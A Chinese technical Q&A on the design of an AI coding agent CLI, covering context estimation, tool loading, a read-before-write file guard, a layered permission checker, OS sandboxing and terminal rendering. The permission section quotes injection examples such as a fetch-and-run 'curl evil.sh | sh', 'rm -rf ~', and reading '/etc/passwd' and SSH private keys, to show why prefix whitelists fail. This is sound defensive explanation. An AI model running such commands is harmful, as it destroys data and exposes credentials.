每次 LLM 响应返回真实 `usage` 后记录锚点: `baselineTokens` 是当时全部历史的真实 token 数, `_anchorCount` 是当时的历史长度. 之后的估算 (`compact.ts:232` `currentContextTokens()`) :

```
currentTokens = baselineTokens + estimateMessages(history.slice(anchorCount))
              = 真实值 + 增量部分的字符估算
```

误差只累积在锚点之后的新增消息上 (通常一两轮, 误差极小) , 下一轮 API 响应又会刷新锚点归零误差. 这是"测量-估算混合"模式: 能用真实数据的绝不用估算, 必须估算时把估算窗口压到最短.

锚点失效时机: 压缩后 (历史被重写, `clearUsageAnchor()`) 、ContextTooLongError 恢复后. 冷启动 (尚无锚点) 则全量字符估算兜底.

---

### 工具 schema 在不同协议间如何转换? `ToolSchema` 上有哪些值得注意的扩展字段?

内部统一为 `ToolSchema` (JSON Schema 风格: `{ name, description, input_schema: { type:"object", properties, required } }`) , 出站时按协议转换:

- Anthropic: 直映射为 `Anthropic.Tool` (结构几乎一致) , 并给最后一个 schema 加 `cache_control` 断点.
- OpenAI Responses: 包一层 `{ type: "function", strict: false }`.
- Chat Completions: 包两层 `{ type: "function", function: { name, description, arguments: input_schema } }`.

`ToolSchema` 的扩展字段 (`tools/types.ts`) 体现了前瞻性设计:

- `defer_loading?: boolean` —— 配合延迟加载机制, 提示协议层该工具初始不发送;
- `cache_control?: { type: "ephemeral"; ttl?: "5m" | "1h" }` —— Anthropic 缓存提示, 支持 1 小时长 TTL;
- `eager_input_streaming?: boolean` —— 标记工具参数可以边生成边流式渲染 (TUI 可实时显示"正在写文件 xxx"而不是等参数 JSON 完整) ;
- `allowed_callers` —— 限制哪些调用者 (如代码执行类工具) 可发起调用, 用于工具间的调用链权限.

这些字段说明 schema 不只是"给模型看的说明书", 还承载了调度策略 (延迟加载) 、成本策略 (缓存) 、UX 策略 (流式预览) 、安全策略 (调用者白名单) 四类元信息 —— 是工具系统的"单一事实来源".

---

## 四、工具系统与延迟加载

### 工具接口是如何设计的? `category` 字段为什么是整个系统的枢纽?

`tools/types.ts` 中的核心接口:

```ts
interface Tool {
  name: string;
  description: string;
  category: "read" | "write" | "command";
  deferred?: boolean; // 初始对模型隐藏, 经 ToolSearch 发现
  schema(): ToolSchema;
  execute(ctx: ToolContext, args): Promise<ToolResult>;
}
```

`ToolContext` 注入执行环境: `workDir`、`abortSignal` (协作式取消) 、`fileHistory` (编辑追踪, 供回滚) 、`fileStateCache` (先读后写门禁) .

`category` 是枢纽, 因为它被三个独立子系统消费:

1. 执行调度: `partitionToolCalls()` 只把 `read` 类并入并行批 (见「工具调用的分批并行」) ;
2. 权限决策: `default` 模式下 read 直接放行、write/command 需询问 —— category 是权限矩阵的输入维度;
3. 安全兜底: 注册表查不到的工具按 `command` 处理 (最严等级) , 执行串行、权限询问.

一个字段驱动"并行度、权限严格度、兜底策略"三种行为, 是因为这三者对"操作是否有副作用"的判断标准本就一致. 把副作用性声明为工具的静态元数据, 而不是在执行时动态推断, 让各子系统可以独立、廉价地做决策.

---

### 什么是延迟工具 (deferred tool) 机制? 它如何解决"工具过多导致上下文膨胀"的问题?

问题背景: MCP 服务器可能暴露数十上百个工具, 若全部 schema 注入系统提示, 一次请求的工具描述就能吃掉数万 token, 还会稀释模型对核心工具的注意力.

机制 (`tools/registry.ts` + `tools/tool-search.ts`) :

1. 标记隐藏: 工具可标记 `deferred: true` (MCP 工具注册时默认 `deferred = true`, 见 mcp/tool-wrapper.ts:78; 但若全部 MCP schema 总量低于上下文窗口的 10%, mcp/strategy.ts 的 eager 模式会清除该标记全量加载, 见「MCP 工具进入上下文的三种模式」) . `getAllSchemas()` 过滤掉未发现的 deferred 工具 —— 模型初始只看到核心工具 + 一个 `ToolSearch` 工具.
2. 按需发现: 模型需要时调用 `ToolSearch`, 两种方式:
   - 关键词搜索: `searchDeferred(query)` 对 name/description 做大小写不敏感的 `includes()` 匹配, 最多返回 5 个候选的完整 schema;
   - 精确选择: `select:name1,name2` 语法按名直接激活.
3. 发现即注册: `markDiscovered(name)` 把工具加入 `discovered` 集合, 后续 `getAllSchemas()` 开始包含它 —— 对模型而言"工具池随需增长".

本质是把工具列表也当作一种需要分页/搜索的资源, 与"工具结果太大要落盘" (见「上下文管理的两道防线」的 applyBudget) 同属一个思想: 上下文窗口是稀缺资源, 一切可延迟加载的都延迟加载. 这与前端的代码分割 (code splitting) + 按需 import 在思想上完全同构 —— 初始 bundle (核心工具) 最小化, 功能模块 (deferred 工具) 按需加载.

---

### `fileStateCache` 的"先读后写"门禁是如何实现的? 它防御的是什么问题?

`tools/file-state-cache.ts` 维护 `Map<path, mtimeMs>` —— 记录每个文件"最后被本会话读取时的修改时间":

- `record()`: ReadFile 成功后调用, 登记 mtime;
- `check()`: WriteFile/EditFile 执行前的门禁, 两种拒绝:
  - 从未读过 → `"file has not been read yet, read it first before editing."`;
  - 磁盘 mtime > 缓存 mtime → `"file has been modified since last read, read it again."` (读完后文件被外部改了) ;
- `update()`: 写成功后刷新 mtime.

防御两类真实故障:

1. 盲写覆盖: 模型凭训练印象直接写它"以为"的文件内容, 覆盖掉仓库里的真实代码. 强制先读, 保证写入基于真实内容.
2. 陈旧上下文编辑 (lost update) : EditFile 的 `old_string` 替换依赖"模型看到的版本", 若用户或其他进程在读后改了文件, 替换要么失配 (好情况) 、要么错误命中 (灾难) . mtime 校验把这变成了显式失败.

注意它用的是 mtime 乐观锁而非文件锁 —— 不阻止外部修改, 只检测并显式失败, 把"重新读取"的决定权交回模型. 配合 EditFile 内部的唯一性校验 (`old_string` 出现 0 次或多次都报错) 和 `old_string === new_string` 拒绝, 构成了一套轻量但有效的"编辑安全网".

另外, mtime 检查有刻意的人性化设计: `statSync` 失败 (文件在读后被删除) 时 `check` 返回 ok —— 让下游的写入逻辑自己报更具体的错, 而不是门禁越权报误导性错误.

---

### EditFile 的 diff 是如何生成的? 为什么没有直接用 Myers/LCS 这类通用 diff 算法?

`tools/diff.ts` 用的是公共前后缀裁剪法, 而非通用 diff:

1. 正向扫描: 找到新旧内容逐行相等的最长公共前缀;
2. 反向扫描: 找到最长公共后缀 (不与前缀重叠) ;
3. 中间夹着的部分: 旧文件的为删除块 (`-`) , 新文件的为新增块 (`+`) ;
4. 变更区上下各附带 `CONTEXT_LINES = 3` 行上下文, 总行数超 `MAX_DIFF_LINES = 200` 截断.

为什么够用且更好: EditFile 的变更本质是单点替换 —— `old_string` 替换为 `new_string`, 变更区天然连续. 公共前后缀法在这种形态下输出与 Myers 完全一致, 但:

- 实现约 40 行, 零依赖, 无 LCS 动态规划的 O(mn) 时空开销;
- 输出格式可控: 直接产出 `"{+|-| } {行号:4位} {内容}"` 的统一格式, TUI 的 `DiffLines` 组件按行首字符上色 (`+` 绿、`-` 红、其余暗色) ;
- 行为确定: 通用 diff 的"最小编辑距离"在边界情况会给出反直觉的对齐, 前后缀法的结果永远符合"改了一小段"的直觉.

这是典型的"利用问题域约束简化算法": 通用 diff 解决任意两个文本的差异, 而这里已知差异必然是单一连续区块, 约束条件让简单算法成为最优解. 若未来支持多点编辑 (多个 old/new 对) , 才需要升级到真正的 Myers.

---

### Bash 工具是如何执行命令的? 为什么必须用异步 API 而不是同步?

`tools/bash.ts` 用异步 `execFile("bash", ["-c", command], { timeout, killSignal: "SIGTERM", maxBuffer: 10MB })` 包在 Promise 里执行. 源码注释记录了这段演进史: 最初用同步执行, 结果在整条命令执行期间 TUI 冻结 (spinner 动画、elapsed 计时器、键盘输入全部卡死) ; 换成异步执行后 Node 事件循环保持空闲, UI 才能继续响应.

异步是必然选择的原因:

1. TUI 由事件循环驱动: Ink 渲染、定时器 (spinner 动画、elapsed 计时) 、`useInput` 键盘事件都依赖事件循环空闲. 同步 API 阻塞主线程, 任何耗时稍长的命令都会让整屏冻结;
2. 工具执行模型本就是 await 语义: Agent 在 `await tool.execute(...)` 处等待结果, 异步只是让出事件循环 —— 逻辑上同样阻塞, 但等待期间 UI 事件照常处理;
3. 上层并行批仍然有效: 并行批 `Promise.all` 下多个 execFile 子进程真正并发执行, 同步 API 则会让并行批退化为串行.

超时与输出处理:

- timeout: 由 Node 内核实现, 到时用 `killSignal: "SIGTERM"` 强杀子进程. 默认 120s, 硬上限 `MAX_TIMEOUT = 600` 秒;
- abortSignal: `ctx.abortSignal` 接入 execFile 的 `signal`, 用户按 Esc 可中断子进程 (AbortError → "Error: command interrupted") ;
- `maxBuffer: 10MB` 是最后防线: 超限则子进程被杀、截断后的输出照常返回; 真正的体积控制在上层 (agent 层单结果超 `MAX_OUTPUT_CHARS = 50000` 落盘、budget 层管聚合, 见「上下文管理的两道防线」) ;
- stdout/stderr 分别捕获后拼接 (不加前缀, 避免污染模型对输出的解析) ;
- 非零退出码附加语义提示 (`exitCodeHint()`) : 如 grep 退出码 1 提示"no matches found"、diff 退出码 1 提示"files differ" —— 把 Unix 退出码惯例翻译成模型能理解的自然语言, 避免模型把"无匹配"误判为"命令失败"而反复重试.

沙箱包装在执行前: `if (sandbox?.available()) actualCommand = sandbox.wrap(command, config)` —— 见「OS 级沙箱的实现」.

---

## 五、权限系统与 OS 沙箱

### 权限检查器 (PermissionChecker) 的分层决策管线是怎样的? 请按优先级逐层说明.

`permissions/checker.ts` 的 `check()` 是一条短路求值的分层管线, 靠前的层更具体、更优先:

- Layer 0 — plan 模式计划文件例外: mode 为 `plan` 且目标是 WriteFile/EditFile 且 `file_path` 含 `.yukino/plans/` → 直接 allow. 让模型在只读的计划模式下也能写计划文件, 是"模式约束内的合法出口".
- Layer 2 — 只读命令白名单: command 类工具过 `isSafeCommand()` (见「isSafeCommand 的元字符守卫」) , 命中 → allow.
- Layer 3 — 危险命令黑名单: `detectDangerous()` 检查 `DANGEROUS_PATTERNS`, 命中 → 直接 deny, 不问用户 —— 有些操作连"用户误点允许"的风险都不能冒. 值得注意现状: 源码中该模式数组当前为空 (checker.ts:59 "Keep it empty array", rm -rf、fork 炸弹等旧模式已整体注释掉, checker.ts:61-79) , 即这一层目前不会命中任何命令, 机制保留但规则集清空.
- Layer 3.5 — 沙箱自动放行: OS 沙箱可用且工具为 Bash 时, 把复合命令按 `&&`/`||`/`;`/`|` 拆分为子命令逐个过规则引擎 —— 任一 deny 则整体 deny、有 ask 则整体 ask, 否则 allow. 命令将在内核级隔离中运行, 即使恶意也伤不到宿主, HITL 询问无增量价值.
- Layer 4 — 路径沙箱 (PathSandbox) : 文件类工具限定在项目目录 + os.tmpdir 内; 项目内的 `.yukino/config.yaml`、`.yukino/permissions.local.yaml`、`.yukino/skills/` 在拒绝写名单 (`DEFAULT_DENY_WRITE`, checker.ts:125-129) → deny.
- Layer 4b — "allow always" 规则: 用户点"不再询问"后, `allowAlways()` (`checker.ts:548-571`) 把授权转为一条 scoped 规则并持久化 —— 文件类工具按"父目录 + `/*`", 命令类按"前 1-2 个词 + `*`" (即整个命令族) , 经 `ruleEngine.appendLocalRule()` (`checker.ts:347-367`) 写入项目本地规则 YAML (同 `Tool(pattern)` 格式、去重) . 该规则下次检查经 Layer 5 的规则引擎命中 → allow, 且跨会话重启仍然生效.
- Layer 5 — YAML 规则引擎 (RuleEngine) : 用户/项目/本地三级 YAML 规则文件, `ToolName(pattern)` 形式的 glob 规则 → 按规则 allow/deny/ask. 规则文件按 mtime+size 缓存, 文件变化后下一次检查即读到新规则, 改规则立即生效.
- Layer 6 — 模式矩阵兜底 (`modeDecide()`) : `default` (read 放行, write/command 询问) 、`acceptEdits` (write 放行, command 询问) 、`plan` (write/command 均询问) 、`bypassPermissions` (全放行) .

设计原则: "例外 → 白名单 → 黑名单 → 环境隔离 → 资源边界 → 用户记忆 → 用户规则 → 模式默认", 从具体到一般排列. 任何一层给出确定结论即短路, 保证可预测性; 同时 allow/deny/ask 三态而非布尔, 保留了"询问"这个 HITL 中间态.

---

### `isSafeCommand()` 的"元字符守卫"是什么? 为什么单纯的前缀匹配不安全?

朴素方案是"命令前缀白名单": `ls`、`cat`、`git status` 等开头即放行. 但这有经典注入漏洞 —— `cat /etc/passwd; rm -rf ~` 以 `cat` 开头却执行任意命令; `ls $(curl evil.sh | sh)` 同理.

`isSafeCommand()` (`checker.ts:380`) 因此是两阶段检查:

1. 元字符守卫: 先扫描整条命令, 含 `>`、`|`、`;`、`&&`、`$(`、反引号 任一即直接判定"不安全" (不是拒绝, 而是交还给后续权限层询问) . 这些 shell 元字符能把"安全前缀"变成任意执行的跳板.
2. 前缀匹配: 过了守卫的命令, 再与只读命令前缀表匹配 (`ls`、`cat`、`git status`、`git log` 等) , 命中才自动放行.

这是"先验证载体完整性, 再验证语义白名单"的纵深防御: 前缀匹配回答"这是什么命令", 元字符守卫回答"这条命令串是否纯粹". 单独做任何一个都不安全 —— 只做前缀匹配有注入漏洞; 只做元字符守卫则 `cat ~/.ssh/id_rsa` 这类"纯但敏感"的命令会被放行.

类比: 这与 XSS 防御中"先转义再校验"同理 —— 任何"对不可信输入做模式匹配"的场景, 都必须先排除组合/转义带来的语义改变.

---

### 权限模式 (permission mode) 有哪几种? 各自语义与典型使用场景是什么?

四种模式构成严格度梯度, TUI 中 Shift+Tab 循环切换 (`MODEL_CYCLE = ["default", "acceptEdits", "plan", "bypassPermissions"]`) :

| 模式                | read | write               | command | 场景                                             |
| ------------------- | ---- | ------------------- | ------- | ------------------------------------------------ |
| `default`           | 放行 | 询问                | 询问    | 日常开发默认, 最安全                             |
| `acceptEdits`       | 放行 | 放行                | 询问    | 信任模型改代码, 但命令需把关 —— 适合重构类任务   |
| `plan`              | 放行 | 询问 (计划文件除外) | 询问    | 计划模式: 模型只能调研和产出计划, 退出需用户审批 |
| `bypassPermissions` | 放行 | 放行                | 放行    | 沙箱环境/容器内全自动执行                        |

两个模式有额外的"行为语义"而不只是权限语义:

- plan 模式是一套完整工作流: 进入时保存原模式 (`prePlanMode`) ; Agent 循环每轮注入 plan 提醒 (判定为 `(iteration - 1) % 5 === 0` 即第 1/6/11... 轮用完整版、其余精简版) ; 模型通过 `ExitPlanModeTool` 结束规划; 循环结束时弹出 `PlanApprovalDialog`, 用户可选 yolo (切 bypass 执行) / manual (恢复原模式执行) / feedback (打回反馈继续规划) . 权限模式在这里扮演了状态机的状态.
- bypassPermissions 配合沙箱才有意义: Layer 3.5 的"沙箱自动放行"与 bypass 的区别是 —— 沙箱放行有内核隔离背书, bypass 是裸奔. 生产实践中 bypass 应只在容器/VM 中使用.

模式的持久化: `permission_mode` 可写入 YAML 配置作为会话默认值; 而"不再询问"的授权会被持久化为本地规则 YAML 中的 scoped 规则 (`allowAlways()` → `appendLocalRule()`, 见「PermissionChecker 的分层决策管线」Layer 4b) —— 授权粒度被收敛到"目录/命令族", 且 deny > ask > allow 的优先级保证任何 deny 规则都无法压制它, 跨会话生效.

---

### OS 级沙箱是如何实现的? macOS seatbelt 与 Linux bubblewrap 的差异如何收敛?

`sandbox/index.ts` 定义统一接口 `Sandbox { available(): boolean; wrap(command, config): string }`, 工厂 `createSandbox()` 按平台返回实现, `wrap()` 的职责是把原始命令包装成沙箱化命令字符串 (bash 工具执行前调用) :

- macOS — seatbelt.ts: 生成 sandbox-exec 的 profile (Scheme DSL) , 策略大致为 `(deny default)` 之上放行进程派生、读取全盘、写入限定目录 (项目目录 + tmpdir) 、按 `networkEnabled` 决定网络. 最终命令变为 `sandbox-exec -p <profile> bash -c <command>`.
- Linux — bwrap.ts: 用 bubblewrap 的命名空间隔离, 挂载绑定控制文件系统可见性 (项目目录 rw、其余 ro 或不可见) , `--unshare-net` 控制断网.

差异收敛在两层:

1. 能力模型抽象: 统一为 `SandboxConfig { networkEnabled, allowWrite[], denyWrite[] }`, 两个后端各自把该模型翻译成自己的规则语言;
2. 可用性探测: `available()` 检测平台与二进制是否存在, 不可用时整个沙箱层静默降级 —— bash 工具照常执行, 只是失去 Layer 3.5 的自动放行 (命令退化为询问用户) .

与权限系统的关系是互补而非替代: 权限层是"决策" (要不要执行) , 沙箱层是"隔离" (执行时伤不到什么) . Layer 3.5 把两者联动 —— "有沙箱背书的无害命令"跳过 HITL, 在安全和体验间取得平衡: 用户不被频繁打断, 而即使模型被注入恶意命令, 内核级隔离也限制了爆炸半径 (blast radius) .

---

### 延伸思考: "如果让你设计这个权限系统的下一步演进, 你会做什么? " 如何回答才体现深度?

可以从五个方向展开, 每个都对应现有设计的真实局限:

1. 规则引擎的表达能力升级: 当前 YAML 规则是 glob 匹配 `ToolName(pattern)`, 无法表达参数级语义 (如"`Bash(npm install *)` 允许但 `Bash(npm publish *)` 拒绝"之外的组合条件) . 可引入类似 Cedar/OPA 的策略语言, 支持参数解构、正则、组合条件, 并附带 `yukino policy test` 的本地规则测试器.
2. 权限审计与回放: 当前决策无持久审计日志. 应落盘"时间、工具、参数摘要、命中层、决策、用户选择"五元组, 配合 `--audit` 回放 —— 企业场景的合规刚需, 也为规则调优提供数据.
3. 风险分级询问: 当前 ask 是同质化的. 可对参数做风险评分 (路径敏感度、命令的破坏半径、网络出向) , 低风险询问可合并批量确认 ("允许本次会话所有 npm test 类命令") , 减少打断频次.
4. "不再询问"的作用域细化: allowAlways 目前固定写入项目本地规则, 模式自动放宽到"目录/_"或"命令族_". 可细化为"本会话/本项目/全局"三档 + 过期时间, 并让用户在 `/permission` 命令中可视化管理这些规则.
5. 沙箱覆盖度补齐: 当前沙箱只包 bash; 网络出向控制可上提到 LLM API 之外 (MCP server、WebFetch 类工具) , 形成统一的网络策略面; Windows 平台可用 Job Object + 受限 token 补齐第三后端.

回答这类问题的结构模板: 指出现状局限 (证明读过代码) → 给出方案 (证明能设计) → 说明权衡 (证明有工程判断力) .

---

## 六、TUI 渲染层与性能优化

### Ink 的 `<Static>` 组件在 Yukino 中扮演什么角色? 消息是如何"提交"到不可变区域的?

终端渲染有个根本约束: 已滚出可视区的内容无法再修改 (终端不是 DOM, 没有真正的重绘已滚动区域的能力) . Ink 的 `<Static>` 正是为此设计: 其子树渲染一次后写入终端回滚缓冲区 (scrollback) , 之后任何 React 更新都不再触碰它, 也不参与 `eraseLines` 清屏.

Yukino 将全部消息传入 `<Static>` 的 items 数组 (`app.tsx:1930-1944`) :

```tsx
<Static
  key={`transcript-${sessionIdRef.current}-${String(termWidth)}-${String(toolsExpanded)}`}
  items={[
    { type: "brand", _key: "brand", model, workDir },
    ...messages.map((message, index) => ({
      type: "message", _key: `message-${index}`, message,
    })),
  ]}
>
  {(item) => item.type === "brand" ? <BrandHeader .../> : <MessageBlock .../>}
</Static>
```

"提交"并非由显式索引控制, 而是 Ink `<Static>` 的内建行为: 它内部记录已渲染的 items 数量, 每次 re-render 只渲染新增的 items. 因此消息一旦通过 `setMessages` 进入数组, 就被 `<Static>` 渲染到回滚区并永不重绘.

消息进入数组的时机:

- `turn_complete`: 本轮 thinking/工具调用折叠为 `turn_summary`, 流式文本保留为 `assistant`, 一并 push 进消息列表;
- `loop_complete`: assistant 最终正文 push 进列表;
- `/clear`: 清空消息数组; `/resume`: 从持久化恢复全部消息.

`key` 的设计值得注意: 包含 sessionId、termWidth、toolsExpanded 三个维度. 终端宽度变化时, 已打印的行会重新换行导致 Ink 的 `eraseLines` 计数失准, 此时通过改变 key 强制卸载并重新挂载 `<Static>`, 整个转录区在新宽度下重印 (先 `\x1b[2J\x1b[H` 清可视区, 保留回滚) .

收益有三:

1. 零闪烁: 历史消息永不重绘, 只有动态区 (流式文本 + spinner + 对话框) 在更新;
2. 渲染成本恒定化: 无论对话多长, 每帧 React 协调的动态子树大小恒定, 长会话不退化;
3. 终端语义正确: 回滚区内容用户可向上翻阅, 且不受后续清屏影响.

类比前端: `<Static>` 之于终端 约等于 `content-visibility: auto` + 虚拟列表之于长页面 —— 都是"把已离开焦点区域的内容从渲染管线上摘除".

---

### 流式文本的 50ms 节流具体如何实现? 为什么不直接用 lodash throttle 或 React 18 的 `useDeferredValue`?

实现 (`app.tsx:1544-1551`) :

```ts
case "stream_text":
  fullText += event.text;
  streamingTextRef.current = fullText;
  streamThrottleRef.current ??= setTimeout(() => {
    setStreamingText(streamingTextRef.current);
    streamThrottleRef.current = null;
  }, 50);
```

三个要点: `??=` 保证同一窗口只调度一个定时器 (合并窗口内全部 delta) ; 回调读 `streamingTextRef.current` 而非闭包变量 (拿到最新值, 见「streamingTextRef 可变 ref 镜像」) ; `turn_complete`/`loop_complete` 时显式清定时器并冲刷最终值 (保证尾帧不丢) .

为什么不用现成方案:

- lodash throttle 的 trailing 语义: throttle(fn, 50) 的 trailing 调用用的是最后一次调用的参数 —— 但事件处理器里的"参数"就是 event 对象, 传参渲染会引入中间态; 手写版直接读 ref 快照, 语义是"渲染此刻的最新累计值", 更贴合流式场景. 且少一个依赖.
- `useDeferredValue`: 延迟值仍会在每次 setState 时参与协调, 只是低优先级 —— 高频 setState 本身 (每秒几十次) 就是开销源, 节流要消灭的是 setState 次数本身. 且 Ink 的渲染目标 (终端 diff + ANSI 写入) 比 DOM 更新昂贵得多, 必须在数据源头限频.
- `useSyncExternalStore` 类方案: Agent 循环是命令式的 `for await`, 把事件流转成外部 store 快照再订阅, 架构上多一层, 收益不如一行 `??=` 直接.

经验: 高频事件源 → ref 累积 + 定时器合帧 → 低频 setState, 这与浏览器中 scroll/pointermove 的处理套路一致, 只是"帧"的定义从 rAF (16ms) 放宽到 50ms (终端渲染贵 + 人眼对文本流不敏感) .

---

### `StreamingText` 组件的"稳定前缀缓存"是什么? 它把 markdown 解析的复杂度从多少降到多少?

问题: 流式渲染要对文本做 markdown 解析 (`marked`) , 若每帧全量解析累计文本, 第 n 帧成本 O(n), 总成本 O(n²) —— 长回复后半段会明显卡顿.

`StreamingText` (`chat.tsx:90`) 的解法:

```ts
const boundary = text.lastIndexOf("\n\n");
const stableText = text.slice(0, stableEnd); // 已闭合段落
const unstableText = text.slice(stableEnd); // 尾部进行中的段落
if (stableText.length > stableRef.current.text.length) {
  stableRef.current = {
    text: stableText,
    rendered: renderMarkdown(stableText),
  };
}
const fullRendered = stableRef.current.rendered + renderMarkdown(unstableText);
```

- 以 `\n\n` (段落边界) 把文本切成稳定前缀 (段落已闭合, 解析结果不会再变) 与不稳定尾部 (最后一段还在生长) ;
- 稳定前缀只有变长时才重解析, 结果缓存进 ref; 不稳定尾部每帧重解析, 但其长度被段落大小限制 (通常几十字符) ;
- 总成本降为 O(n) (每个字符只被"稳定化"时解析一次) , 逐帧成本 O (段落长度) .

正确性的关键假设: marked 对"以段落边界切分的前缀"的解析结果与全文解析的前缀部分一致 —— 对绝大多数块级语法成立 (`\n\n` 是块级分隔符) . fenced code block 跨段是已知边界情况, 实践中可接受.

另有配套的物理行截断: 动态区只渲染能放进终端高度的最后 N 行 (预留 12 行给输入框/状态栏等) , 防止动态区超高触发 Ink 清屏. 两个优化一纵 (解析) 一横 (渲染) , 共同保证长回复的流畅性.

---

### `app.tsx` 约 2150 行、70+ 个 `useState`/`useRef`, 是如何避免变成"巨石组件"失控的? 它的状态分层策略是什么?

`app.tsx` 的状态可清晰分为五层, 这是它没有失控的根本原因:

1. 渲染态 (useState) : `messages`、`streamingText`、`activeTools`、`error` 等 —— 直接驱动视图的;
2. 镜像态 (useRef 双写) : `streamingTextRef`、`permModeRef` —— 异步回调需要最新值的 (见「streamingTextRef 可变 ref 镜像」) ;
3. 边界态 (useRef) : `headerPrintedRef`、`submittingRef` (重入守卫) 、`streamingTextRef` (流式文本镜像) —— 参与逻辑但不驱动渲染;
4. 服务实例态 (useRef) : `clientRef`、`convRef`、`registryRef`、`hookEngineRef`、`teamManagerRef` 等十几个 —— 本质是用 ref 当依赖注入容器: 这些对象有方法、有内部状态、生命周期等于会话, 放进 ref 既不触发渲染又保证单例;
5. 异步句柄态 (useRef) : `permissionResolveRef`、`askResolveRef`、`abortControllerRef`、`streamThrottleRef` —— 跨渲染帧存活的 Promise/定时器句柄.

关键架构选择: 领域逻辑不下放为 React 状态. 对话历史在 `ConversationManager` (普通类) 、工具在 `ToolRegistry`、团队在 `TeamManager` —— React 只是这些领域对象的"投影". `messages` state 是投影的结果而非事实来源. 因此 `app.tsx` 虽长, 但长而不乱: 每个 ref/state 职责单一, 事件循环 (`for await`) 是唯一的调度主线.

可改进点 (延伸) : 渲染态可用 `useReducer` 收敛 (`ask-user-dialog.tsx` 已示范 —— 用 reducer 管理多问题向导的 next/prev/update/set-submit-cursor) ; 事件循环的 switch 可拆为每事件类型的 handler 映射表.

---

### 输入框 (InputBox) 在 Ink 里是如何从零实现的? 包括光标、多行、历史、自动补全.

Ink 没有 `<input>` 组件, `input.tsx` (795 行) 基于 `useInput` 原始按键事件自建了微型文本编辑器:

文本模型: `lines: string[]` + `cursorLine`/`cursorCol` 光标坐标. 字符插入是切片拼接 `line.slice(0, col) + input + line.slice(col)`; Shift+Enter/Ctrl+J 在光标处拆行实现多行; 光标渲染用 `<Text inverse>` 反色显示光标位字符. 粘贴被 Ink 合并为单条含 `\r\n` 的输入, 按多字符批量插入处理.

历史召回: 上箭头 (单行且无下拉时) 在 `promptHistory` 中向前游走, 下箭头向后, 索引归零时清空输入; 历史条目按 `\n` 拆分以支持多行召回.

斜杠命令自动补全: 五级匹配管道 (`useMemo`) —— 精确名 > 精确别名 > 前缀名 > 前缀别名 > Fuse.js 模糊匹配 (权重 name:3 / aliases:2 / description:0.5, 阈值 0.4) ; `CommandUsageTracker` 把最近使用的命令提顶; 若输入是最佳匹配的前缀, 剩余字符以暗色"幽灵文本"显示在光标后.

@文件展开: 行尾出现 `@<partial>` 时弹文件下拉 —— `scanWorkdirFiles()` 递归扫描 (跳过 `SKIP_DIRS` 和点文件, 上限 2000) , 结果缓存于 `fileCacheRef` (每次挂载只扫一次) ; 前缀匹配优先、子串次之, 上限 8 条; Tab/Enter 补全为 `@<path> `.

模式切换: 检测 Shift+Tab (终端序列为 `\x1b[Z` 或 `key.tab && key.shift`) 循环四种权限模式.

性能细节: 所有下拉过滤都是 `useMemo` (依赖为 lines/commands/atQuery) , 文件扫描结果用 ref 缓存 —— 每次按键只重算最小集合.

---

### `installSyncOutput()` 做了什么? 终端"撕裂"问题与浏览器的 vsync 有什么类比?

终端撕裂: Ink 每帧输出包含"光标定位 + 擦除 + 重写"多段 ANSI 序列, 若终端模拟器在序列写到一半时刷新屏幕, 用户会看到半新半旧的中间帧 (闪烁/撕裂) .

`sync-output.ts` 用 DEC 2026 同步输出协议解决: monkey-patch `process.stdout.write`, 把所有写入包进 BSU (`\x1b[?2026h`, 开始同步更新) / ESU (`\x1b[?2026l`, 结束) 信封 —— 支持的终端 (iTerm2、WezTerm、Warp、kitty、foot、alacritty、Ghostty、VTE≥6800、Windows Terminal 等) 会攒住整帧内容直到 ESU 才一次性上屏.

合帧用 `queueMicrotask`:

```ts
frameBuffer += str;
if (!scheduled) {
  scheduled = true;
  queueMicrotask(() => { originalWrite(BSU + frameBuffer + ESU); ... });
}
```

同一微任务内的所有同步 write 合并为一个信封, 成本几乎为零.

能力探测读取 `TERM_PROGRAM`、`TERM`、环境变量白名单, tmux 下禁用 (tmux 会吞掉该序列) —— 探测失败时静默不启用, 优雅降级.

类比: BSU/ESU 就是终端世界的 vsync / 双缓冲交换 —— 浏览器里你把所有 DOM 修改放进一个 rAF 回调, 渲染引擎在垂直同步时一次性合成; 这里把所有 ANSI 写入放进一个同步信封, 终端在信封闭合时一次性上屏, 用户看到的永远是完整的一帧, 而不是拼到一半的残影.

---

### 权限对话框、提问向导、计划审批这些交互组件, 在键盘交互设计上有哪些共性模式?

三个对话框体现了终端键盘交互的统一模式语言:

1. 选项列表 + 光标 + 回车确认: `PermissionDialog` 三个固定选项 (Yes / Yes, don't ask again / No) , 上下键循环 (边界回绕) , Enter 选择, Esc 一律视为拒绝 —— 拒绝是零成本默认动作, 安全交互的基本原则.
2. 向导模式 (多步表单) : `AskUserDialog` (508 行, 最复杂) 用 `useReducer` 管理 `currentQuestion + answers + submitCursor` 状态机: 顶部导航条展示问题页签 (已答项带对勾标记) ; 上下键选选项、Tab/左右键切问题、数字键直跳选项、空格切换多选、"Other"进入自由文本; 答完进入 Submit 页复核. 单问题非多选时隐藏 Submit 页、选完即提交 —— 按复杂度自适应流程长度.
3. 破坏性操作的双段确认: 计划审批三选项 (yolo / manual / feedback) , Esc 默认落到最保守的 manual; 反馈文本用 Shift+Tab 提交避免与 Enter 冲突.
4. 统一的中断语义: 所有对话框期间 Ctrl+C/Esc 都有明确含义 (拒绝/取消) , 与全局 Ctrl+C 双击退出 (`ctrlCCountRef` + 2 秒窗口计数器) 分层: 对话框消费优先, 冒泡到全局的是"无对话框时"的退出.

把对话框实现为"注入给 Agent 的 Promise 工厂 + 键盘状态机组件" (见「权限确认的 Promise 悬挂模式」) , 业务侧永远只看到 `await ask(...)` —— 交互复杂度被完全封装在组件内部.

---

### 团队/子代理的实时进度在 UI 上如何呈现? 为什么团队状态用轮询而不是事件驱动?

两条路径:

- 子代理 (in-process) : `AgentTool` 的 spawn 回调给每个子代理分配单调递增 id, `onProgress({turn, lastTool})` 回调直接 `setSubagents(...)` —— 同进程, 可直接事件驱动, 渲染为动态区的品红进度行 (`label · turn N · lastTool`) .
- 团队 teammate (可能跨进程) : `app.tsx:392` 每 500ms 轮询 `TeamManager.getAllTeammateStates()`, 渲染为 `TeammateSpinnerTree` 进度树 + 状态栏 `TeamStatus` 徽标.

团队用轮询的原因:

1. 跨进程边界: teammate 可以是独立子进程 (甚至 tmux 窗口) , 状态经由文件系统传递 (进度文件/JSONL 邮箱) , 文件系统没有可靠的跨进程事件机制 (fs.watch 在 macOS/Linux 行为不一、对追加写不敏感) , 轮询是唯一可移植语义.
2. 简单性与韧性: 轮询天然容忍 teammate 崩溃 (状态文件停更即显示停滞) 、重启、乱序写入 —— 事件驱动需要处理丢失、重复、乱序, 轮询每次读到的是全量快照, 幂等.
